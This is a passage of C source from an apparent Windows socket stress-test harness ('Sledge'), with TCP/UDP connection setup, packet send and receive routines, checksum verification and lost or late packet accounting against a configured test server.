    int   Result = 0;

    BYTE *Packet, PacketNumber;

    int   CurrentPacketsOutCount, LastPacketExpected, MaxPacketExpected;
    int   CurrentPacketExpected, SkippedPackets;
    int   Reps, Len, Offset;

//  SledgeLog(g_hLog, XLL_INFO, "Client recv thread started");

    Packet = (BYTE *) LocalAlloc(LPTR, PACKET_MAX_LEN);

    if (NULL == Packet)
    {
        SledgeLog(g_hLog, XLL_WARN, "Sledge[%d,%s]: unable to allocate packet",
            pConn->Index, CONN_TYPES_Str[pConn->ConnType]);

        SignalTestExit(0);
        goto DONE;
    }

    while(1)
    {
//      SledgeLog(g_hLog, XLL_INFO, "Waiting for send thread to signal");

        WaitForSingleObject(pConn->hPacketsOutEvent, INFINITE);

//      SledgeLog(g_hLog, XLL_INFO, "Send thread signaled");

        EnterCriticalSection(&g_csSledgeCritSection);

        CurrentPacketsOutCount = pConn->PacketsOutCount;
        MaxPacketExpected = g_SledgeParms.PacketsPerConn - 1;
        CurrentPacketExpected = MIN(pConn->PacketsOut[pConn->PacketsOutTail].Index, MaxPacketExpected);
        LastPacketExpected = MIN(CurrentPacketExpected + CurrentPacketsOutCount - 1, MaxPacketExpected);


        LeaveCriticalSection(&g_csSledgeCritSection);

        TimedOut = FALSE;

        //Added UDP Support...
        if(pConn->ConnType == CONN_UDP)
        {

            for(Reps = 0; (Reps < CurrentPacketsOutCount) && (!TimedOut);)
            {
                if (RandomRange(0, 99) < (ULONG) g_SledgeParms.ClientSleepyRecvs)
                {
                    pConn->SleepyRecv = TRUE;

                    Sleep(SLEEP_BEFORE_RECV_MS);
                }

                Len = PACKET_MAX_LEN;

                Result = RecvPacketDGRAM(pConn, &Len, Packet);
                if(Result == DEATH_BY_HATCHET)
                {
                    SocketClosed = TRUE;
                    goto ExitClientRecvThread;
                }
                else if (Result == RECEIVE_TIMED_OUT)
                {
                    TimedOut = TRUE;

                    //Since we waited a fair ammount of time to receive a
                    //packet, go ahead and assume that it is lost... increment
                    //the tail pointer by the number of packets that we were
                    //waiting for and decrement the number of packets that
                    //are currently listed as "out"

                    EnterCriticalSection(&g_csSledgeCritSection);
                    pConn->PacketsOutTail = (pConn->PacketsOutTail + (CurrentPacketsOutCount - Reps))
                        % MAX_PACKETS_IN_FLIGHT;
                    pConn->PacketsOutCount -= (CurrentPacketsOutCount - Reps);
                    pConn->TotalLostPackets += (CurrentPacketsOutCount - Reps);
                    LeaveCriticalSection(&g_csSledgeCritSection);

                    //All the packets for this cycle haven't been
                    //received yet...
                    continue;
                }

//              SledgeLog(g_hLog, XLL_INFO, "Received packet %d containing %d bytes", Packet[0], Len);

                //Otherwise, we received a packet... since this is an unguaranteed
                //protocol, we can't count on in-order delivery, or reliable delivery
                //We must determine which packet this is by reading the first byte...
                PacketNumber = Packet[0];

                //We weren't expecting this packet, we'd already assumed it was lost
                //We won't log it as a successfully received packet... instead we'll
                //log it as late... then continue
                if(PacketNumber < CurrentPacketExpected)
                {
                    EnterCriticalSection(&g_csSledgeCritSection);

                    pConn->TotalLatePackets++;
                    pConn->TotalLostPackets--;

                    LeaveCriticalSection(&g_csSledgeCritSection);
                    continue;
                }
                // This packet has an invalid packet number... drop it
                // and continue
                else if (PacketNumber > MaxPacketExpected)
                    continue;

                EnterCriticalSection(&g_csSledgeCritSection);

                //If the packet number of the packet we received has a higher number
                //than the one we were expecting, we assume that any packets between
                //the one expected and the one received were lost and we skip them.
                SkippedPackets = 0;

                for(Offset = 0; Offset < (PacketNumber - CurrentPacketExpected); Offset++)
                {
                    SkippedPackets++;
                    pConn->PacketsOutCount--;

                    //In the rare event that we received a packet before the sending
                    //thread incremented its head marker, leave the critical section
                    //and give it some time...
                    while(((pConn->PacketsOutTail + 1) % MAX_PACKETS_IN_FLIGHT) == pConn->PacketsOutHead)
                    {
                        LeaveCriticalSection(&g_csSledgeCritSection);
                        Sleep(1000);
                        EnterCriticalSection(&g_csSledgeCritSection);
                    }
                    pConn->PacketsOutTail = (pConn->PacketsOutTail + 1)
                        % MAX_PACKETS_IN_FLIGHT;
                    pConn->TotalLostPackets++;

                    //Since we were expecting this packet,
                    Reps++;
                }
                CurrentPacketExpected += SkippedPackets;

                //Now that any skipped packets have been accounted for, update
                //our info for the packet we just received
                //This packet just doesn't add up...
                if (CheckSum(Len, Packet) !=
                    pConn->PacketsOut[pConn->PacketsOutTail].CheckSum)
                {
                    pConn->TotalBadPackets++;

                    SledgeLog(g_hLog, XLL_WARN, "Received packet failed checksum");
                    LeaveCriticalSection(&g_csSledgeCritSection);
                    continue;
                }

//              SledgeLog(g_hLog, XLL_INFO, "Received packet passed checksum");

                CurrentPacketExpected++;
                pConn->PacketsOutCount--;
                pConn->PacketsOutTail = (pConn->PacketsOutTail + 1)
                    % MAX_PACKETS_IN_FLIGHT;
                Reps++;
                g_dwTotalPacketsIn++;
                g_dwTotalBytesIn += Len;
                pConn->TotalPacketsIn++;
                pConn->TotalBytesIn += Len;
                pConn->DeltaBytesIn += Len;

                LeaveCriticalSection(&g_csSledgeCritSection);

                if(PacketNumber >= MaxPacketExpected)
                    goto ExitClientRecvThread;
            }

            //Since this was the last packet expected for this cycle,
            //end the receive thread...
            if(LastPacketExpected >= MaxPacketExpected)
                goto ExitClientRecvThread;
        }
        else
        {

            for (Reps = 0; Reps < CurrentPacketsOutCount; Reps++)
            {

                EnterCriticalSection(&g_csSledgeCritSection);

                Len = pConn->PacketsOut[pConn->PacketsOutTail].Len;

                LeaveCriticalSection(&g_csSledgeCritSection);

                if (RandomRange(0, 99) < (ULONG) g_SledgeParms.ClientSleepyRecvs)
                {
                    pConn->SleepyRecv = TRUE;

                    Sleep(SLEEP_BEFORE_RECV_MS);
                }

                switch(pConn->ConnType)
                {
                case CONN_TCP:
                    Result = RecvPacketSTREAM(pConn, Len, Packet, (Len == -1));
                    if ( Result == DEATH_BY_HATCHET)
                    {
                        SocketClosed = TRUE;
                        goto ExitClientRecvThread;
                    }

                    if (Len == -1)
                        goto ExitClientRecvThread;
                    break;
                default:
                    SledgeLog(g_hLog, XLL_WARN, "Sledge[%d,%s]: invalid connection type", pConn->Index, CONN_TYPES_Str[pConn->ConnType]);
                    SignalTestExit(0);
                    goto DONE;
                }

//              SledgeLog(g_hLog, XLL_INFO, "Received packet %d containing %d bytes", Packet[0], Len);

                if (CheckSum(Len, Packet) != pConn->PacketsOut[pConn->PacketsOutTail].CheckSum)
                {
                    OutputDebugString(L"Checksum failed.\n");
                    __asm int 3;

                    SledgeLog(g_hLog, XLL_WARN, "Sledge[%d,%s]: CheckSum failed, packet len %d",
                        pConn->Index, CONN_TYPES_Str[pConn->ConnType],
                        Len);

                    SledgeLog(g_hLog, XLL_WARN, "Sledge[%d,%s]: CheckSum expected %d, received %d",
                        pConn->Index, CONN_TYPES_Str[pConn->ConnType],
                        pConn->PacketsOut[pConn->PacketsOutTail].CheckSum,
                        CheckSum(Len, Packet));

                    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST);

                    SledgeLog(g_hLog, XLL_WARN, " Client            Packet Size");
                    SledgeLog(g_hLog, XLL_WARN, "Connection Cycle  Min  Max  Avg   Packets      Bytes    Bytes/s");
                    SledgeLog(g_hLog, XLL_WARN, "---------- ----- ---- ---- ---- ----------- ----------- -------");

                    SledgeLog(g_hLog, XLL_WARN, "%3d %6s %5d %4d %4d %4d %11d %11d %7d (send)",
                        pConn->Index,
                        CONN_TYPES_Str[pConn->ConnType],
                        pConn->Cycle,
                        pConn->PacketLenMin,
                        pConn->PacketLenMax,
                        (pConn->TotalPacketsOut > 0) ?
                        pConn->TotalBytesOut /
                        pConn->TotalPacketsOut :
                    0,
                        pConn->TotalPacketsOut,
                        pConn->TotalBytesOut,
                        0);

                    SledgeLog(g_hLog, XLL_WARN, "                                %11d %11d %7d (recv)",
                        pConn->TotalPacketsIn,
                        pConn->TotalBytesIn,
                        0);
                    SignalTestExit(0);
                    goto DONE;
                }

//              SledgeLog(g_hLog, XLL_INFO, "Received packet passed checksum");

                EnterCriticalSection(&g_csSledgeCritSection);

                g_dwTotalPacketsIn++;
                g_dwTotalBytesIn += Len;

                pConn->TotalPacketsIn++;
                pConn->TotalBytesIn += Len;
                pConn->DeltaBytesIn += Len;

                pConn->PacketsOutTail = (pConn->PacketsOutTail + 1)
                    % MAX_PACKETS_IN_FLIGHT;
                pConn->PacketsOutCount--;

                LeaveCriticalSection(&g_csSledgeCritSection);
            }
        }
    }

ExitClientRecvThread:

    SledgeLog(g_hLog, XLL_INFO, "Recv thread complete.");

    if (SocketClosed)
    {
        EnterCriticalSection(&g_csSledgeCritSection);

        if (pConn->SendThreadDown)
            CloseConn(pConn);

        pConn->RecvThreadDown = TRUE;

        LeaveCriticalSection(&g_csSledgeCritSection);
    }
    else
    {
        //Without this, it is possible for the recv thread to overtake
        //the send thread and kill the socket before the send thread
        //exits...
        while(! pConn->SendThreadDown)
            Sleep(1000);

        EnterCriticalSection(&g_csSledgeCritSection);

        pConn->RecvThreadDown = TRUE;

        pConn->PacketsOutTail = (pConn->PacketsOutTail + 1)
            % MAX_PACKETS_IN_FLIGHT;
        pConn->PacketsOutCount--;

        CloseConn(pConn);

        LeaveCriticalSection(&g_csSledgeCritSection);
    }

    SetEvent(g_hCreateThreadsEvent);

DONE:

    LocalFree (Packet);

    return(0);
}

//==================================================================================
// OpenConn
//----------------------------------------------------------------------------------
//
// Description: Establish a connection to the server
//
// Arguments:
//  CLIENT_CONNS    *pConn          Pointer to the CLIENT_CONNS struct for this client
// Returns:
//  none
//==================================================================================
void OpenConn(CLIENT_CONNS *pConn)
{

    SOCKADDR_IN     DstAddrIP  = { AF_INET }, LclAddrIP = { AF_INET };
    ULONG           uNonBlockParam = TRUE;

    int           RepeatCount = 0;

    switch(pConn->ConnType)
    {
    case CONN_TCP:
        DstAddrIP.sin_port        = htons(TCP_SERV_PORT);
        DstAddrIP.sin_addr.s_addr = htonl(g_SledgeParms.ServTCPAddr);

//      SledgeLog(g_hLog, XLL_INFO, "Creating TCP socket");

        if ((pConn->Sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
        {
            SledgeLog(g_hLog, XLL_WARN, "Sledge[%d,%s]: socket() failed %s",
                pConn->Index, CONN_TYPES_Str[pConn->ConnType],
                GetLastErrorText());

            SignalTestExit(0);
            return;
        }

        // If necessary, set the socket for non-blocking IO
        if(g_fNonBlocking)
        {
//          SledgeLog(g_hLog, XLL_INFO, "Set socket as non-blocking");
            if(ioctlsocket(pConn->Sock, FIONBIO, &uNonBlockParam) == SOCKET_ERROR)
            {
                SledgeLog(g_hLog, XLL_WARN, "Sledge[%s]: ioctlsocket() error %s while setting to non-blocking",
                    CONN_TYPES_Str[CONN_TCP], GetLastErrorText());
                SignalTestExit(0);
                return;
            }
        }

        while (1)
        {
//          SledgeLog(g_hLog, XLL_INFO, "Connecting socket");
            if (connect(pConn->Sock, (const struct sockaddr *) &DstAddrIP,  sizeof(SOCKADDR_IN)) == SOCKET_ERROR)
            {
//              SledgeLog(g_hLog, XLL_INFO, "Connect returned an error");

                // If this test is non-blocking, then wait for the connection to complete
                if(g_fNonBlocking && (WSAGetLastError() == WSAEWOULDBLOCK))
                {
                    if(!WaitForWriteableSocket(pConn->Sock))
                    {
                        SledgeLog(g_hLog, XLL_WARN, "Sledge[%d,%s]: Failed waiting for connection to complete",
                            pConn->Index, CONN_TYPES_Str[pConn->ConnType]);
                        SignalTestExit(0);
                        return;
                    }
                    else
                        break;
                }

                if (WSAGetLastError() == WSAECONNREFUSED)
                {
                    if (RepeatCount++ == CLIENT_TCP_CONNECT_RETRIES)
                    {
                        SledgeLog(g_hLog, XLL_WARN, "Sledge[%d,%s]: connect(0x%02X%02X 0x%02X%02X 0x%02X%02X%02X%02X) failed %s (%d times)",
                            pConn->Index, CONN_TYPES_Str[pConn->ConnType],
                            ((BYTE *) &DstAddrIP)[0], ((BYTE *) &DstAddrIP)[1],
                            ((BYTE *) &DstAddrIP)[2], ((BYTE *) &DstAddrIP)[3],
                            ((BYTE *) &DstAddrIP)[4], ((BYTE *) &DstAddrIP)[5],
                            ((BYTE *) &DstAddrIP)[6], ((BYTE *) &DstAddrIP)[7],
                            GetLastErrorText(),
                            CLIENT_TCP_CONNECT_RETRIES);

                        SignalTestExit(0);
                        return;
                    }
                }
                else
                {
                    SledgeLog(g_hLog, XLL_WARN, "Sledge[%d,%s]: connect(0x%02X%02X 0x%02X%02X 0x%02X%02X%02X%02X) failed %s",
                        pConn->Index, CONN_TYPES_Str[pConn->ConnType],
                        ((BYTE *) &DstAddrIP)[0], ((BYTE *) &DstAddrIP)[1],
                        ((BYTE *) &DstAddrIP)[2], ((BYTE *) &DstAddrIP)[3],
                        ((BYTE *) &DstAddrIP)[4], ((BYTE *) &DstAddrIP)[5],
                        ((BYTE *) &DstAddrIP)[6], ((BYTE *) &DstAddrIP)[7],
                        GetLastErrorText());

                    SignalTestExit(0);
                    return;
                }
                Sleep(1000);
            }
            else
            {
//              SledgeLog(g_hLog, XLL_INFO, "Connect succeeded");
                break;
            }
        }

        break;

    case CONN_UDP:
        LclAddrIP.sin_family      = AF_INET;
        LclAddrIP.sin_port        = htons(UDP_SERV_PORT);
        LclAddrIP.sin_addr.s_addr = INADDR_ANY;

        if ((pConn->Sock = socket(AF_INET, SOCK_DGRAM, 0)) == INVALID_SOCKET)
        {
            SledgeLog(g_hLog, XLL_WARN, "Sledge[%d,%s]: socket() failed %s",
                pConn->Index, CONN_TYPES_Str[pConn->ConnType],
                GetLastErrorText());

            SignalTestExit(0);
            return;
        }

        // If necessary, set the socket for non-blocking IO
        if(g_fNonBlocking)
        {
            if(ioctlsocket(pConn->Sock, FIONBIO, &uNonBlockParam) == SOCKET_ERROR)
            {
                SledgeLog(g_hLog, XLL_WARN, "Sledge[%s]: ioctlsocket() error %s while setting to non-blocking",
                    CONN_TYPES_Str[CONN_UDP], GetLastErrorText());
                SignalTestExit(0);
                return;
            }
        }

        if (bind(pConn->Sock, (const struct sockaddr *) &LclAddrIP,
            sizeof(SOCKADDR_IN)) == SOCKET_ERROR)
        {
            SledgeLog(g_hLog, XLL_WARN, "Sledge[%d,%s]: bind() failed %s",
                pConn->Index, CONN_TYPES_Str[pConn->ConnType],
                GetLastErrorText());

            SignalTestExit(0);
            return;
        }
        break;
    default:
        SledgeLog(g_hLog, XLL_WARN, "Sledge[%d,%s]: invalid connection type",
            pConn->Index, CONN_TYPES_Str[pConn->ConnType]);
        SignalTestExit(0);
        return;

    }

    pConn->Connected = TRUE;
}

//==================================================================================
// CloseConn
//----------------------------------------------------------------------------------
//
// Description: Close connection to the server
//
// Arguments:
//  CLIENT_CONNS    *pConn          Pointer to the CLIENT_CONNS struct for this client
// Returns:
//  none
//==================================================================================
void CloseConn(CLIENT_CONNS *pConn)
{
    switch(pConn->ConnType)
    {
    case CONN_TCP:
    case CONN_UDP:
        pConn->InClose = TRUE;

        if (closesocket(pConn->Sock) == SOCKET_ERROR)
        {
            pConn->InClose = FALSE;

            if (g_SledgeParms.InFlightCloses)
            {
                if (GetLastError() != WSAENOTSOCK)
                {
                    SledgeLog(g_hLog, XLL_WARN, "Sledge[%d,%s]: closesocket() failed %s",
                        pConn->Index, CONN_TYPES_Str[pConn->ConnType],
                        GetLastErrorText());

                    SignalTestExit(0);
                    return;
                }
            }
            else
            {
                SledgeLog(g_hLog, XLL_WARN, "Sledge[%d,%s]: closesocket() failed %s",
                    pConn->Index, CONN_TYPES_Str[pConn->ConnType],
                    GetLastErrorText());

                SignalTestExit(0);
                return;
            }
        }

        pConn->Sock = INVALID_SOCKET;

        pConn->InClose = FALSE;
        break;
    default:
        SledgeLog(g_hLog, XLL_WARN, "Sledge[%d,%s]: invalid connection type",
            pConn->Index, CONN_TYPES_Str[pConn->ConnType]);
        SignalTestExit(0);
        return;
    }

    pConn->Connected = FALSE;
}

//==================================================================================
// RecvPacketSTREAM
//----------------------------------------------------------------------------------
//
// Description: Receive packet from a reliable data source (e.g. TCP connection)
//
// Arguments:
//  CLIENT_CONNS    *pConn          Pointer to the CLIENT_CONNS struct for this client
//  int             Len             Length of the passed in buffer
//  BYTE            Buff[]          Buffer to be filled with the data
//  BOOL            ExpectingClose  Bool indicating whether a socket close is expected
// Returns:
//  0 for success, error code otherwise
//==================================================================================
int RecvPacketSTREAM(CLIENT_CONNS *pConn, int Len, BYTE Buff[],
                 BOOL ExpectingClose)
{
    int    TotalBytesRead = 0;
    ULONG  BytesRead;
    DWORD  dwLastError = 0;

    if (ExpectingClose)
        Len = 1;

    while (TotalBytesRead < Len)
    {

//      SledgeLog(g_hLog, XLL_INFO, "Calling recv() with %d bytes", Len - TotalBytesRead);

        EnterCriticalSection(&(pConn->csSendRecv));
        pConn->InRecv = TRUE;

        if ((BytesRead = recv(pConn->Sock, (char *) Buff + TotalBytesRead,
            Len - TotalBytesRead, 0)) == SOCKET_ERROR)
        {
            pConn->InRecv = FALSE;
            LeaveCriticalSection(&(pConn->csSendRecv));
//          SledgeLog(g_hLog, XLL_INFO, "recv() returned an error");

            dwLastError = WSAGetLastError();

            // If this is a non-blocking test, wait for pending data before calling recv again
            if(g_fNonBlocking && (dwLastError == WSAEWOULDBLOCK))
            {
                Sleep(0);
                continue;
            }

            OutputDebugString(L"recv() failed\n");
            __asm int 3;

            // If there was another blocking operation, we have to go back and try again
            if(dwLastError == WSAEINPROGRESS)
            {
                if(!pConn->InSend)
                    SledgeLog(g_hLog, XLL_WARN, "Socket is already blocking, but we aren't sending: RecvInProgress %d, SendInProgress %d"
                    ,pConn->RecvInProgress, pConn->SendInProgress);

                pConn->RecvInProgress = pConn->RecvInProgress + 1;
                Sleep(100);
                continue;
            }

            if (g_SledgeParms.InFlightCloses)
            {
                if (GetLastError() != WSAENOTSOCK     &&
                    GetLastError() != WSAECONNRESET   &&
                    GetLastError() != WSAECONNABORTED &&
                    GetLastError() != WSAESHUTDOWN    &&
                    GetLastError() != WSAENOTCONN     &&
                    GetLastError() != WSAEINVAL       &&
                    GetLastError() != WSAEDISCON      &&
                    GetLastError() != WSAEINTR)
                {

                    SledgeLog(g_hLog, XLL_WARN, "Sledge[%d,%s]: recv() failed %s(%u)",
                        pConn->Index, CONN_TYPES_Str[pConn->ConnType],
                        GetLastErrorText(), dwLastError);

                    SignalTestExit(0);
                    return (-1);
                }
                else
                    return(DEATH_BY_HATCHET);
            }
            else
            {
                SOCKADDR_IN addrLocal;
                INT         addrLen;

                addrLen = sizeof(SOCKADDR_IN);
                getsockname(pConn->Sock, (struct sockaddr *) &addrLocal, &addrLen);

                SledgeLog(g_hLog, XLL_WARN, "Sledge[%d,%s]: recv() failed %s(%u) on port 0x%x on cycle %d, %d packets out, %d packets in",
                    pConn->Index, CONN_TYPES_Str[pConn->ConnType], GetLastErrorText(), WSAGetLastError(),
                    ntohs(addrLocal.sin_port), pConn->Cycle, pConn->TotalPacketsOut, pConn->TotalPacketsIn);

                SignalTestExit(0);
                return (-1);
            }
        }

        pConn->InRecv = FALSE;
        LeaveCriticalSection(&(pConn->csSendRecv));

//      SledgeLog(g_hLog, XLL_INFO, "recv() returned success");

        if (ExpectingClose && BytesRead == 0)
            return(0);

        if ((! ExpectingClose) && BytesRead == 0)
        {
            SledgeLog(g_hLog, XLL_WARN, "Sledge[%d,%s]: recv() unexpected socket close",
                pConn->Index, CONN_TYPES_Str[pConn->ConnType]);

            SignalTestExit(0);
            return (-1);
        }

        TotalBytesRead += BytesRead;
    }

    return(0);
}

//==================================================================================
// RecvPacketDGRAM
//----------------------------------------------------------------------------------
//
// Description: Receive packet from datagram data source (e.g. UDP connection)
//
// Arguments:
//  CLIENT_CONNS    *pConn          Pointer to the CLIENT_CONNS struct for this client
//  int             Len             Length of the passed in buffer
//  BYTE            Buff[]          Buffer to be filled with the data
// Returns:
//  0 for success, error code otherwise
//==================================================================================
int RecvPacketDGRAM(CLIENT_CONNS *pConn, int *Len, BYTE Buff[])
{
    BOOL         Loop = FALSE;
    ULONG        BytesRead;

RECV:
    EnterCriticalSection(&(pConn->csSendRecv));
    pConn->InRecv = TRUE;

    if ((BytesRead = recvfrom(pConn->Sock, (char *) Buff, *Len, 0, NULL, NULL)) == SOCKET_ERROR)
    {
        pConn->InRecv = FALSE;
        LeaveCriticalSection(&(pConn->csSendRecv));

        // If this is a non-blocking test, wait for pending data before calling recv again
        if(g_fNonBlocking && (WSAGetLastError() == WSAEWOULDBLOCK))
        {
            if(!WaitForReadableSocket(pConn->Sock))
            {
                SignalTestExit(0);
                return (-1);
            }

            EnterCriticalSection(&(pConn->csSendRecv));
            pConn->InRecv = TRUE;
            if ((BytesRead = recvfrom(pConn->Sock, (char *) Buff, *Len, 0, NULL, NULL)) != SOCKET_ERROR)
            {
                pConn->InRecv = FALSE;
                LeaveCriticalSection(&(pConn->csSendRecv));
                goto UDPReadOK;
            }
            pConn->InRecv = FALSE;
            LeaveCriticalSection(&(pConn->csSendRecv));
        }

        // If there was another blocking operation, we have to go back and try again
        if(WSAGetLastError() == WSAEINPROGRESS)
        {
            if(!pConn->InSend)
                SledgeLog(g_hLog, XLL_WARN, "Socket is already blocking, but we aren't sending: RecvInProgress %d, SendInProgress %d"
                ,pConn->RecvInProgress, pConn->SendInProgress);

            pConn->RecvInProgress = pConn->RecvInProgress + 1;
            Sleep(100);
            goto RECV;
        }

        if (g_SledgeParms.InFlightCloses)
        {
            if (GetLastError() != WSAENOTSOCK     &&
                GetLastError() != WSAECONNRESET   &&
                GetLastError() != WSAECONNABORTED &&
                GetLastError() != WSAESHUTDOWN    &&
                GetLastError() != WSAENOTCONN     &&
                GetLastError() != WSAEINVAL       &&
                GetLastError() != WSAEDISCON      &&
                GetLastError() != WSAEINTR)
            {
                SledgeLog(g_hLog, XLL_WARN, "Sledge[%d,%s]: recv() failed %s",
                    pConn->Index, CONN_TYPES_Str[pConn->ConnType],
                    GetLastErrorText());

                SignalTestExit(0);
                return (-1);
            }
            else
            {

                return(DEATH_BY_HATCHET);
            }
        }
        else
        {
            SledgeLog(g_hLog, XLL_WARN, "Sledge[%d,%s]: recv() failed %s",
                pConn->Index, CONN_TYPES_Str[pConn->ConnType],
                GetLastErrorText());

            SignalTestExit(0);
            return (-1);
        }
    }

    pConn->InRecv = FALSE;
    LeaveCriticalSection(&(pConn->csSendRecv));

// The recvfrom succeeded
UDPReadOK:

    pConn->InRecv = FALSE;

    if (BytesRead == 0)
    {
        SledgeLog(g_hLog, XLL_WARN, "Sledge[%d,%s]: recv() unexpected socket close",
            pConn->Index, CONN_TYPES_Str[pConn->ConnType]);

        SignalTestExit(0);
        return (-1);
    }

    *Len = BytesRead;

    return(0);
}

//==================================================================================
// SendPacketSTREAM
//----------------------------------------------------------------------------------
//
// Description: Send packet via reliable communications (e.g. TCP connection)
//
// Arguments:
//  CLIENT_CONNS    *pConn          Pointer to the CLIENT_CONNS struct for this client
//  int             Len             Length of the passed in buffer
//  BYTE            Buff[]          Buffer containing data to send
// Returns:
//  0 for success, error code otherwise
//==================================================================================
int SendPacketSTREAM(CLIENT_CONNS *pConn, int Len, BYTE Buff[])
{
    ULONG  BytesSent, TotalBytesSent;
    DWORD  dwLastError = 0;

//  SledgeLog(g_hLog, XLL_INFO, "Entered SendPacketSTREAM");

    if(Len <= 0)
        return (0);

    TotalBytesSent = 0;
    while(TotalBytesSent < (ULONG) Len)
    {

//      SledgeLog(g_hLog, XLL_INFO, "Calling send() with %d bytes", Len - TotalBytesSent);

        EnterCriticalSection(&(pConn->csSendRecv));
        pConn->InSend = TRUE;

        if ((BytesSent = send(pConn->Sock, (char *) Buff + TotalBytesSent, Len - TotalBytesSent, 0)) == SOCKET_ERROR)
        {
//          SledgeLog(g_hLog, XLL_INFO, "send() returned an error");

            pConn->InSend = FALSE;
            LeaveCriticalSection(&(pConn->csSendRecv));

            dwLastError = WSAGetLastError();

            // If this is a non-blocking test, wait for 100ms before calling send again
            if(g_fNonBlocking && (dwLastError == WSAEWOULDBLOCK))
            {
                Sleep(0);
                continue;
            }

            OutputDebugString(L"send() failed\n");
            __asm int 3;

            // If there was another blocking operation, we have to go back and try again
            if(dwLastError == WSAEINPROGRESS)
            {
                if(!pConn->InRecv)
                    SledgeLog(g_hLog, XLL_WARN, "Socket is already blocking, but we aren't recving: RecvInProgress %d, SendInProgress %d"
                    ,pConn->RecvInProgress, pConn->SendInProgress);

                pConn->SendInProgress = pConn->SendInProgress + 1;
                Sleep(100);
                continue;
            }

            if (g_SledgeParms.InFlightCloses)
            {
                if (GetLastError() != WSAENOTSOCK     &&
                    GetLastError() != WSAECONNRESET   &&
                    GetLastError() != WSAECONNABORTED &&
                    GetLastError() != WSAESHUTDOWN    &&
                    GetLastError() != WSAENOTCONN     &&
                    GetLastError() != WSAEINVAL       &&
                    GetLastError() != WSAEDISCON      &&
                    GetLastError() != WSAEINTR)
                {
                    SledgeLog(g_hLog, XLL_WARN, "Sledge[%d,%s]: send() failed %s",
                        pConn->Index, CONN_TYPES_Str[pConn->ConnType],
                        GetLastErrorText());

                    SignalTestExit(0);
                    return (-1);
                }
                else
                    return(GetLastError());
            }
            else
            {
                SOCKADDR_IN addrLocal;
                INT         addrLen;

                addrLen = sizeof(SOCKADDR_IN);
                getsockname(pConn->Sock, (struct sockaddr *) &addrLocal, &addrLen);

                SledgeLog(g_hLog, XLL_WARN, "Sledge[%d,%s]: send() failed %s on port 0x%x on cycle %d, %d packets out, %d packets in",
                    pConn->Index, CONN_TYPES_Str[pConn->ConnType],
                    GetLastErrorText(), ntohs(addrLocal.sin_port), pConn->Cycle, pConn->TotalPacketsOut, pConn->TotalPacketsIn);

                SignalTestExit(0);
                return (-1);

            }
        }
        else
        {
            pConn->InSend = FALSE;
            LeaveCriticalSection(&(pConn->csSendRecv));
        }

//      SledgeLog(g_hLog, XLL_INFO, "send() returned success");

        TotalBytesSent += BytesSent;
    }

    if ((int) TotalBytesSent != Len)
    {
        SledgeLog(g_hLog, XLL_WARN, "Sledge[%d,%s]: TotalBytesSent (%u) != Len (%u)", pConn->Index, CONN_TYPES_Str[pConn->ConnType],
            TotalBytesSent, Len);
        SignalTestExit(0);
        return (-1);
    }

    return(0);
}

//==================================================================================
// SendPacketDGRAM
//----------------------------------------------------------------------------------
//
// Description: Send packet via unreliable communications (e.g. UDP connection)
//
// Arguments:
//  CLIENT_CONNS    *pConn          Pointer to the CLIENT_CONNS struct for this client
//  int             Len             Length of the passed in buffer
//  BYTE            Buff[]          Buffer containing data to send
// Returns:
//  0 for success, error code otherwise
//==================================================================================
int SendPacketDGRAM(CLIENT_CONNS *pConn, int Len, BYTE Buff[])
{
    ULONG         BytesSent;
    SOCKADDR_IN   DstAddrIP = { AF_INET };

    DstAddrIP.sin_port        = htons(UDP_SERV_PORT);
    DstAddrIP.sin_addr.s_addr = htonl(g_SledgeParms.ServUDPAddr);

    if(Len < 0)
        return (0);

SEND:

    EnterCriticalSection(&(pConn->csSendRecv));
    pConn->InSend = TRUE;

    if ((BytesSent = sendto(pConn->Sock, (char *) Buff, Len, 0,
        (const struct sockaddr *) &DstAddrIP, sizeof(SOCKADDR_IN))) == SOCKET_ERROR)
    {
        pConn->InSend = FALSE;
        LeaveCriticalSection(&(pConn->csSendRecv));

        //Wait for 100ms between sendto attempts...
        while(g_fNonBlocking && (WSAGetLastError() == WSAEWOULDBLOCK))
        {
            EnterCriticalSection(&(pConn->csSendRecv));
            pConn->InSend = TRUE;

            if ((BytesSent =
                sendto(pConn->Sock, (char *) Buff, Len, 0, (const struct sockaddr *) &DstAddrIP, sizeof(SOCKADDR_IN)))
                == SOCKET_ERROR)
            {
                pConn->InSend = FALSE;
                LeaveCriticalSection(&(pConn->csSendRecv));
                if(BytesSent < (ULONG) Len)
                {
                    SledgeLog(g_hLog, XLL_WARN, "Sledge[%d,%s]: sendto() sent a UDP fragment!",
                        pConn->Index,
                        CONN_TYPES_Str[pConn->ConnType]);

                    SignalTestExit(0);
                    return (-1);
                }

                goto UDPWriteOK;
            }

            pConn->InSend = FALSE;
            LeaveCriticalSection(&(pConn->csSendRecv));

            Sleep(100);
        }

        // If there was another blocking operation, we have to go back and try again
        if(WSAGetLastError() == WSAEINPROGRESS)
        {
            if(!pConn->InRecv)
                SledgeLog(g_hLog, XLL_WARN, "Socket is already blocking, but we aren't recving: RecvInProgress %d, SendInProgress %d"
                ,pConn->RecvInProgress, pConn->SendInProgress);

            pConn->SendInProgress = pConn->SendInProgress + 1;
            Sleep(100);
            goto SEND;
        }

        if (g_SledgeParms.InFlightCloses)
        {
            if (GetLastError() != WSAENOTSOCK     &&
                GetLastError() != WSAECONNRESET   &&
                GetLastError() != WSAECONNABORTED &&
                GetLastError() != WSAESHUTDOWN    &&
                GetLastError() != WSAENOTCONN     &&
                GetLastError() != WSAEINVAL       &&
                GetLastError() != WSAEDISCON      &&
                GetLastError() != WSAEINTR)
            {
                SledgeLog(g_hLog, XLL_WARN, "Sledge[%d,%s]: send() failed %s",
                    pConn->Index, CONN_TYPES_Str[pConn->ConnType],
                    GetLastErrorText());

                SignalTestExit(0);
                return (-1);
            }
            else
            {
                return(GetLastError());
            }
        }
        else
        {
            SledgeLog(g_hLog, XLL_WARN, "Sledge[%d,%s]: send() failed %s",
                pConn->Index,
                CONN_TYPES_Str[pConn->ConnType],
                GetLastErrorText());

            SignalTestExit(0);
            return (-1);
        }
    }

    pConn->InSend = FALSE;
    LeaveCriticalSection(&(pConn->csSendRecv));

// The sendto succeeded
UDPWriteOK:

    pConn->InSend = FALSE;

    if ((int) BytesSent != Len)
    {
        SledgeLog(g_hLog, XLL_WARN, "Sledge[%d,%s]: BytesSent != Len",
            pConn->Index, CONN_TYPES_Str[pConn->ConnType]);

        SignalTestExit(0);
